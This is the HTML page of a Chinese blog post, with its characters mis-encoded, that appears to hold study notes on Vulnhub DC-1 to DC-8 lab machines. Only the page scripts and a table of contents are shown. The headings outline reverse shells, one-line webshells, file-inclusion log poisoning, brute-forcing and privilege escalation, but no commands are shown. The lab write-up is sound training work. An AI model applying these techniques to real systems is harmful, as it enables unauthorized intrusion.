<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>Vulnhubé¶åœºå­¦ä¹ ç¬”è®° | Ttoc's blog</title><meta name="author" content="Ttoc"><meta name="copyright" content="Ttoc"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="å­¦ä¹ ä¸€ä¸‹å®æˆ˜é¶åœºï¼Œåšä¸€ä¸‹ç¬”è®° å®æˆ˜ç¯å¢ƒï¼Œ ä¿¡æ¯æ”¶é›†çš„èƒ½åŠ›å†³å®šäº†èƒ½å¦æ¸—é€æˆåŠŸï¼Œä»¥åŠè‡ªå·±ä¼šæµªè´¹è‡ªå·±å¤šå°‘æ—¶é—´">
<meta property="og:type" content="article">
<meta property="og:title" content="Vulnhubé¶åœºå­¦ä¹ ç¬”è®°">
<meta property="og:url" content="https://try-to-change.github.io/2022/08/29/vulnhub/index.html">
<meta property="og:site_name" content="Ttoc&#39;s blog">
<meta property="og:description" content="å­¦ä¹ ä¸€ä¸‹å®æˆ˜é¶åœºï¼Œåšä¸€ä¸‹ç¬”è®° å®æˆ˜ç¯å¢ƒï¼Œ ä¿¡æ¯æ”¶é›†çš„èƒ½åŠ›å†³å®šäº†èƒ½å¦æ¸—é€æˆåŠŸï¼Œä»¥åŠè‡ªå·±ä¼šæµªè´¹è‡ªå·±å¤šå°‘æ—¶é—´">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://try-to-change.github.io/img/17.jpg">
<meta property="article:published_time" content="2022-08-29T07:06:05.187Z">
<meta property="article:modified_time" content="2023-01-17T03:53:51.973Z">
<meta property="article:author" content="Ttoc">
<meta property="article:tag" content="å®æˆ˜">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://try-to-change.github.io/img/17.jpg"><link rel="shortcut icon" href="/img/website.png"><link rel="canonical" href="https://try-to-change.github.io/2022/08/29/vulnhub/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"æ‰¾ä¸åˆ°æ‚¨æŸ¥è¯¢çš„å†…å®¹ï¼š${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"ç¹","msgToSimplifiedChinese":"ç®€"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":230},
  copy: {
    success: 'å¤åˆ¶æˆåŠŸ',
    error: 'å¤åˆ¶é”™è¯¯',
    noSupport: 'æµè§ˆå™¨ä¸æ”¯æŒ'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'å¤©',
  date_suffix: {
    just: 'åˆšåˆš',
    min: 'åˆ†é’Ÿå‰',
    hour: 'å°æ—¶å‰',
    day: 'å¤©å‰',
    month: 'ä¸ªæœˆå‰'
  },
  copyright: {"limitCount":20,"languages":{"author":"ä½œè€…: Ttoc","link":"é“¾æ¥: ","source":"æ¥æº: Ttoc's blog","info":"è‘—ä½œæƒå½’ä½œè€…æ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»ä½œè€…è·å¾—æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"ä½ å·²åˆ‡æ¢ä¸ºç¹ä½“","cht_to_chs":"ä½ å·²åˆ‡æ¢ä¸ºç®€ä½“","day_to_night":"ä½ å·²åˆ‡æ¢ä¸ºæ·±è‰²æ¨¡å¼","night_to_day":"ä½ å·²åˆ‡æ¢ä¸ºæµ…è‰²æ¨¡å¼","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"top-right"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Vulnhubé¶åœºå­¦ä¹ ç¬”è®°',
  isPost: true,
  isHome: false,
  isHighlightShrink: undefined,
  isToc: true,
  postUpdate: '2023-01-17 11:53:51'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          const now = new Date()
          const hour = now.getHours()
          const isNight = hour <= 6 || hour >= 18
          if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
          else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="/css/custom.css"><svg aria-hidden="true" style="position:absolute; overflow:hidden; width:0; height:0"><symbol id="icon-sun" viewBox="0 0 1024 1024"><path d="M960 512l-128 128v192h-192l-128 128-128-128H192v-192l-128-128 128-128V192h192l128-128 128 128h192v192z" fill="#FFD878" p-id="8420"></path><path d="M736 512a224 224 0 1 0-448 0 224 224 0 1 0 448 0z" fill="#FFE4A9" p-id="8421"></path><path d="M512 109.248L626.752 224H800v173.248L914.752 512 800 626.752V800h-173.248L512 914.752 397.248 800H224v-173.248L109.248 512 224 397.248V224h173.248L512 109.248M512 64l-128 128H192v192l-128 128 128 128v192h192l128 128 128-128h192v-192l128-128-128-128V192h-192l-128-128z" fill="#4D5152" p-id="8422"></path><path d="M512 320c105.888 0 192 86.112 192 192s-86.112 192-192 192-192-86.112-192-192 86.112-192 192-192m0-32a224 224 0 1 0 0 448 224 224 0 0 0 0-448z" fill="#4D5152" p-id="8423"></path></symbol><symbol id="icon-moon" viewBox="0 0 1024 1024"><path d="M611.370667 167.082667a445.013333 445.013333 0 0 1-38.4 161.834666 477.824 477.824 0 0 1-244.736 244.394667 445.141333 445.141333 0 0 1-161.109334 38.058667 85.077333 85.077333 0 0 0-65.066666 135.722666A462.08 462.08 0 1 0 747.093333 102.058667a85.077333 85.077333 0 0 0-135.722666 65.024z" fill="#FFB531" p-id="11345"></path><path d="M329.728 274.133333l35.157333-35.157333a21.333333 21.333333 0 1 0-30.165333-30.165333l-35.157333 35.157333-35.114667-35.157333a21.333333 21.333333 0 0 0-30.165333 30.165333l35.114666 35.157333-35.114666 35.157334a21.333333 21.333333 0 1 0 30.165333 30.165333l35.114667-35.157333 35.157333 35.157333a21.333333 21.333333 0 1 0 30.165333-30.165333z" fill="#030835" p-id="11346"></path></symbol></svg><meta name="generator" content="Hexo 5.4.2"><style>.darkmode--activated{--body-bg-color:#282828;--content-bg-color:#333;--card-bg-color:#555;--text-color:#ccc;--blockquote-color:#bbb;--link-color:#ccc;--link-hover-color:#eee;--brand-color:#ddd;--brand-hover-color:#ddd;--table-row-odd-bg-color:#282828;--table-row-hover-bg-color:#363636;--menu-item-bg-color:#555;--btn-default-bg:#222;--btn-default-color:#ccc;--btn-default-border-color:#555;--btn-default-hover-bg:#666;--btn-default-hover-color:#ccc;--btn-default-hover-border-color:#666;--highlight-background:#282b2e;--highlight-foreground:#a9b7c6;--highlight-gutter-background:#34393d;--highlight-gutter-foreground:#9ca9b6}.darkmode--activated img{opacity:.75}.darkmode--activated img:hover{opacity:.9}.darkmode--activated code{color:#69dbdc;background:0 0}button.darkmode-toggle{z-index:9999}.darkmode-ignore,img{display:flex!important}.beian img{display:inline-block!important}</style></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">åŠ è½½ä¸­...</div></div></div><script>const preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',()=> { preloader.endLoading() })

if (false) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/touxiang.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">13</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">6</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> ä¸»é¡µ</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> åšæ–‡</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> åˆ†ç±»</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> æ ‡ç­¾</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> å½’æ¡£</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/17.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Ttoc's blog</a></span><div id="menus"></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> ä¸»é¡µ</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> åšæ–‡</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> åˆ†ç±»</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> æ ‡ç­¾</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> å½’æ¡£</span></a></li></ul></div></div><div id="nav-right"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i></a></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Vulnhubé¶åœºå­¦ä¹ ç¬”è®°</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2022-08-29T07:06:05.187Z" title="å‘è¡¨äº 2022-08-29 15:06:05">2022-08-29</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2023-01-17T03:53:51.973Z" title="æ›´æ–°äº 2023-01-17 11:53:51">2023-01-17</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0/">ç½‘ç»œå®‰å…¨å­¦ä¹ </a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">å­—æ•°æ€»è®¡:</span><span class="word-count">24.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">é˜…è¯»æ—¶é•¿:</span><span>90åˆ†é’Ÿ</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Vulnhubé¶åœºå­¦ä¹ ç¬”è®°"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">é˜…è¯»é‡:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><u><code>å­¦ä¹ ä¸€ä¸‹å®æˆ˜é¶åœºï¼Œåšä¸€ä¸‹ç¬”è®°</code></u></p>
<p><code>å®æˆ˜ç¯å¢ƒï¼Œ</code></p>
<p><code>ä¿¡æ¯æ”¶é›†çš„èƒ½åŠ›å†³å®šäº†èƒ½å¦æ¸—é€æˆåŠŸï¼Œä»¥åŠè‡ªå·±ä¼šæµªè´¹è‡ªå·±å¤šå°‘æ—¶é—´</code></p>
<span id="more"></span>

<h1><span id="ç›®å½•">ç›®å½•</span></h1><!-- toc -->

<ul>
<li><a href="#%E5%89%8D%E8%A8%80">å‰è¨€</a></li>
<li><a href="#dc%E7%B3%BB%E5%88%971~9%E5%AE%8C">DCç³»åˆ—ã€1~9ã€‘(å®Œ)</a></li>
<li><a href="#%E4%B8%80-dc-1%E5%88%9D%E7%BA%A7">ä¸€ã€DC-1[åˆçº§]</a><ul>
<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">ä¿¡æ¯æ”¶é›†</a></li>
<li><a href="#flag1">Flag1</a><ul>
<li><a href="#msf">msf</a></li>
<li><a href="#%E4%BA%A4%E4%BA%92%E5%BC%8Fshell"><code>*äº¤äº’å¼shell</code></a></li>
</ul>
</li>
<li><a href="#flag2">Flag2</a></li>
<li><a href="#flag3">Flag3</a><ul>
<li><a href="#1mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%AE%E6%94%B9admin%E7%94%A8%E6%88%B7%E7%9A%84%E5%AF%86%E7%A0%81%E6%88%96%E8%80%85%E6%96%B0%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81">1ï¼‰mysqlæ•°æ®åº“ä¿®æ”¹adminç”¨æˆ·çš„å¯†ç ï¼ˆæˆ–è€…æ–°å»ºä¸€ä¸ªç”¨æˆ·å¯†ç ï¼‰</a></li>
<li><a href="#2%E5%88%A9%E7%94%A8drupal%E8%84%9A%E6%9C%AC%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E7%94%A8%E6%88%B7">2ï¼‰åˆ©ç”¨drupalè„šæœ¬æ·»åŠ ç®¡ç†å‘˜ç”¨æˆ·</a></li>
</ul>
</li>
<li><a href="#flag4">Flag4</a><ul>
<li><a href="#1%E4%B8%AA%E4%BA%BA%E6%96%B9%E6%B3%95">1ï¼‰ä¸ªäººæ–¹æ³•</a></li>
<li><a href="#2%E5%AE%98%E6%96%B9%E6%96%B9%E6%B3%95">2ï¼‰å®˜æ–¹æ–¹æ³•</a></li>
</ul>
</li>
<li><a href="#flag5">Flag5</a><ul>
<li><a href="#suid%E6%8F%90%E6%9D%83">suidææƒ</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E4%BA%8C-dc-2%E5%88%9D%E7%BA%A7">äºŒã€DC-2[åˆçº§]</a><ul>
<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1">ä¿¡æ¯æ”¶é›†</a></li>
<li><a href="#flag1-1">Flag1</a></li>
<li><a href="#flag2-1">Flag2</a><ul>
<li><a href="#cewl">cewl</a></li>
<li><a href="#wpscan">wpscan</a></li>
</ul>
</li>
<li><a href="#flag3-1">Flag3</a><ul>
<li><a href="#rbash">rbash</a></li>
<li><a href="#vi%E7%BB%95%E8%BF%87-rbash%E9%80%83%E9%80%B8">*viç»•è¿‡-&gt;rbashé€ƒé€¸</a></li>
<li><a href="#%E8%AE%BE%E7%BD%AE%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F">*è®¾ç½®å…¨å±€å˜é‡</a></li>
</ul>
</li>
<li><a href="#flag4-1">Flag4</a></li>
<li><a href="#flag5-1">Flag5</a><ul>
<li><a href="#git%E7%BC%93%E5%AD%98%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E">*gitç¼“å­˜åŒºæº¢å‡ºæ¼æ´</a><ul>
<li><a href="#%E6%B3%A8%E6%84%8F%E7%AA%97%E5%8F%A3%E5%A4%A7%E5%B0%8F">*æ³¨æ„çª—å£å¤§å°</a><ul>
<li><a href="#1%E7%AA%97%E5%8F%A3%E8%B6%B3%E5%A4%9F%E5%A4%A7">1.çª—å£è¶³å¤Ÿå¤§</a></li>
<li><a href="#2%E7%AA%97%E5%8F%A3%E5%B0%8F%E4%B8%80%E4%BA%9B">2.çª—å£å°ä¸€äº›</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E6%B3%95-1%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%E6%8B%BF%E5%88%B0root%E7%9A%84shell">æ³• 1.æ‰§è¡Œå‘½ä»¤ï¼Œæ‹¿åˆ°rootçš„shell</a></li>
<li><a href="#%E6%B3%95-2%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81%E7%99%BB%E5%BD%95">æ³• 2.ä¿®æ”¹å¯†ç ï¼Œç™»å½•</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E4%B8%89-dc-3%E5%88%9D%E7%BA%A7">ä¸‰ã€DC-3[åˆçº§]</a><ul>
<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-2">ä¿¡æ¯æ”¶é›†</a></li>
<li><a href="#john">john</a></li>
<li><a href="#%E5%90%8E%E9%97%A8%E7%94%9F%E6%88%90%E8%BF%9B%E5%85%A5shell">åé—¨ç”Ÿæˆï¼Œè¿›å…¥shell</a><ul>
<li><a href="#%E6%B3%951">æ³•1</a><ul>
<li><a href="#msf%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC">msfç”Ÿæˆæœ¨é©¬</a><ul>
<li><a href="#msf%E5%88%A9%E7%94%A8%E6%9C%A8%E9%A9%AC">msfåˆ©ç”¨æœ¨é©¬</a></li>
<li><a href="#%E6%8F%90%E6%9D%83">ææƒ</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E6%B3%952">æ³•2</a><ul>
<li><a href="#%E5%8F%8D%E5%BC%B9shell"><strong>åå¼¹shell</strong></a></li>
</ul>
</li>
<li><a href="#%E6%B3%953">æ³•3</a><ul>
<li><a href="#weevely%E6%8F%90%E6%9D%83%E6%B2%A1%E5%9B%9E%E6%98%BE"><strong>weevely</strong>ã€ææƒæ²¡å›æ˜¾ã€‘</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E5%9B%9B-dc-4%E5%88%9D%E7%BA%A7">å››ã€DC-4[åˆçº§]</a><ul>
<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-3">ä¿¡æ¯æ”¶é›†</a></li>
<li><a href="#%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4">å¯†ç çˆ†ç ´</a></li>
<li><a href="#hydra%E5%AF%B9%E4%B8%89%E7%94%A8%E6%88%B7%E8%BF%9B%E8%A1%8Cssh%E7%88%86%E7%A0%B4">hydraå¯¹ä¸‰ç”¨æˆ·è¿›è¡Œsshçˆ†ç ´</a></li>
<li><a href="#teehee">teehee</a><ul>
<li><a href="#%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7">æ·»åŠ ç®¡ç†å‘˜è´¦æˆ·</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E4%BA%94-dc-5%E9%AB%98%E7%BA%A7">äº”ã€DC-5[é«˜çº§]</a><ul>
<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-4">ä¿¡æ¯æ”¶é›†</a></li>
<li><a href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">æ–‡ä»¶åŒ…å«</a><ul>
<li><a href="#1%E9%AA%8C%E8%AF%81%E6%88%91%E4%BB%AC%E7%9A%84%E6%83%B3%E6%B3%95">1.éªŒè¯æˆ‘ä»¬çš„æƒ³æ³•</a></li>
<li><a href="#2%E5%88%A9%E7%94%A8%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFshell">2.åˆ©ç”¨æ–‡ä»¶åŒ…å«æ‹¿shell</a><ul>
<li><a href="#1%E5%90%91nginx%E9%94%99%E8%AF%AF%E6%97%A5%E5%BF%97%E5%AF%BC%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D">1ï¼‰å‘Nginxé”™è¯¯æ—¥å¿—å¯¼å…¥ä¸€å¥è¯ğŸ</a></li>
<li><a href="#2nc%E5%91%BD%E4%BB%A4%E5%8F%8D%E5%BC%B9shell">2ï¼‰ncå‘½ä»¤åå¼¹shell</a></li>
<li><a href="#%E8%8E%B7%E5%BE%97%E7%A8%B3%E5%AE%9A%E7%9A%84shell">*è·å¾—ç¨³å®šçš„shell</a></li>
</ul>
</li>
<li><a href="#3%E6%8F%90%E6%9D%83">3.ææƒ</a><ul>
<li><a href="#1searchsploit%E6%89%BE%E6%8F%90%E6%9D%83%E8%84%9A%E6%9C%AC%E6%96%87%E4%BB%B6">1ï¼‰searchsploitæ‰¾ææƒè„šæœ¬æ–‡ä»¶</a></li>
<li><a href="#2nc%E5%90%91%E9%9D%B6%E6%9C%BA%E4%BC%A0%E5%85%A5%E8%84%9A%E6%9C%AC%E6%8F%90%E6%9D%83%E6%96%87%E4%BB%B6">2ï¼‰ncå‘é¶æœºä¼ å…¥è„šæœ¬ææƒæ–‡ä»¶</a></li>
<li><a href="#3%E6%89%A7%E8%A1%8C%E8%84%9A%E6%9C%AC%E8%BF%9B%E8%A1%8C%E6%8F%90%E6%9D%83">3ï¼‰æ‰§è¡Œè„šæœ¬è¿›è¡Œææƒ</a><ul>
<li><a href="#%E5%87%BA%E7%8E%B0%E6%84%8F%E5%A4%96">*<strong>å‡ºç°æ„å¤–</strong></a><ul>
<li><a href="#%E7%BB%99cc1%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F">ç»™<code>cc1</code>é…ç½®ç¯å¢ƒå˜é‡</a></li>
<li><a href="#%E5%85%B3%E9%94%AE%E6%9D%A5%E4%BA%86%E6%9C%9F%E5%BE%85">å…³é”®æ¥äº†ã€æœŸå¾…ã€‘</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E5%85%AD-dc-6%E4%B8%AD%E7%BA%A7">å…­ã€DC-6[ä¸­çº§]</a><ul>
<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-5">ä¿¡æ¯æ”¶é›†</a></li>
<li><a href="#1wpscan%E7%88%86%E7%A0%B4%E5%87%BA%E7%94%A8%E6%88%B7%E5%90%8Ddc2%E9%87%8C%E6%90%9E%E8%BF%87">1.wpscançˆ†ç ´å‡ºç”¨æˆ·åã€dc2é‡Œæè¿‡ã€‘</a></li>
<li><a href="#2wpscan%E7%88%86%E7%A0%B4%E5%AF%86%E7%A0%81">2.wpscançˆ†ç ´å¯†ç </a></li>
<li><a href="#3%E7%99%BB%E5%BD%95%E7%BD%91%E7%AB%99%E6%89%BE%E4%BF%A1%E6%81%AF">3.ç™»å½•ç½‘ç«™æ‰¾ä¿¡æ¯</a><ul>
<li><a href="#150110py%E6%9C%89%E9%97%AE%E9%A2%98%E4%B8%8D%E5%BB%BA%E8%AE%AE%E7%94%A8">1ï¼‰50110.pyã€æœ‰é—®é¢˜ï¼Œä¸å»ºè®®ç”¨ã€‘</a></li>
<li><a href="#245274html">2ï¼‰45274.html</a><ul>
<li><a href="#nc%E7%9B%91%E5%90%AC%E6%8B%BFshell">ncç›‘å¬æ‹¿shell</a></li>
<li><a href="#%E4%BB%A5%E5%85%B6%E4%BB%96%E7%94%A8%E6%88%B7%E8%BA%AB%E4%BB%BD%E8%BF%90%E8%A1%8C%E8%84%9A%E6%9C%AC%E5%AE%9E%E7%8E%B0%E5%88%87%E6%8D%A2%E7%94%A8%E6%88%B7">ä»¥å…¶ä»–ç”¨æˆ·èº«ä»½è¿è¡Œè„šæœ¬ï¼Œå®ç°åˆ‡æ¢ç”¨æˆ·</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#4nmap%E6%8F%90%E6%9D%83">4.nmapææƒ</a><ul>
<li><a href="#1%E6%97%A7%E7%89%88">1.æ—§ç‰ˆ</a></li>
<li><a href="#2%E6%96%B0%E7%89%88">2.æ–°ç‰ˆ</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#%E4%B8%83-dc-7%E4%B8%AD%E7%BA%A7">ä¸ƒã€DC-7[ä¸­çº§]</a><ul>
<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-6">ä¿¡æ¯æ”¶é›†</a></li>
<li><a href="#1%E8%B7%B3%E5%87%BA%E6%A1%86%E6%9E%B6">1.è·³å‡ºæ¡†æ¶</a></li>
<li><a href="#2ssh%E7%99%BB%E5%BD%95">2.sshç™»å½•</a><ul>
<li><a href="#%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1croncrond">*å®šæ—¶ä»»åŠ¡ã€cronï¼ˆcrondï¼‰ã€‘</a></li>
<li><a href="#%E5%85%B3%E9%94%AE%E6%80%9D%E8%B7%AF">*å…³é”®æ€è·¯</a></li>
</ul>
</li>
<li><a href="#3drush%E5%91%BD%E4%BB%A4%E5%AF%B9drupal%E4%BF%AE%E6%94%B9%E7%94%A8%E6%88%B7%E5%90%8D%E5%92%8C%E5%AF%86%E7%A0%81">3.<code>drush</code>å‘½ä»¤å¯¹<code>drupal</code>ä¿®æ”¹ç”¨æˆ·åå’Œå¯†ç </a></li>
<li><a href="#4%E7%99%BB%E5%BD%95%E7%BD%91%E7%AB%99">4.ç™»å½•ç½‘ç«™</a><ul>
<li><a href="#%E6%B7%BB%E5%8A%A0php%E6%89%A7%E8%A1%8C%E6%8F%92%E4%BB%B6">æ·»åŠ phpæ‰§è¡Œæ’ä»¶</a></li>
<li><a href="#%E5%8A%A0%E5%85%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC">åŠ å…¥ä¸€å¥è¯æœ¨é©¬</a></li>
</ul>
</li>
<li><a href="#5%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5getshell">5.èšå‰‘è¿æ¥getshell</a></li>
<li><a href="#6%E5%8F%8D%E5%BC%B9shell%E6%8B%BFwww-data">6.åå¼¹shellæ‹¿www-data</a></li>
<li><a href="#7%E5%88%A9%E7%94%A8%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1cron%E6%8F%90%E6%9D%83root">7.åˆ©ç”¨å®šæ—¶ä»»åŠ¡ã€cronã€‘ææƒ<code>root</code></a></li>
</ul>
</li>
<li><a href="#%E5%85%AB-dc8%E5%88%9D%E7%BA%A7">å…«ã€DC8[åˆçº§]</a><ul>
<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-7">ä¿¡æ¯æ”¶é›†</a></li>
<li><a href="#1sql%E6%B3%A8%E5%85%A5">1.sqlæ³¨å…¥</a></li>
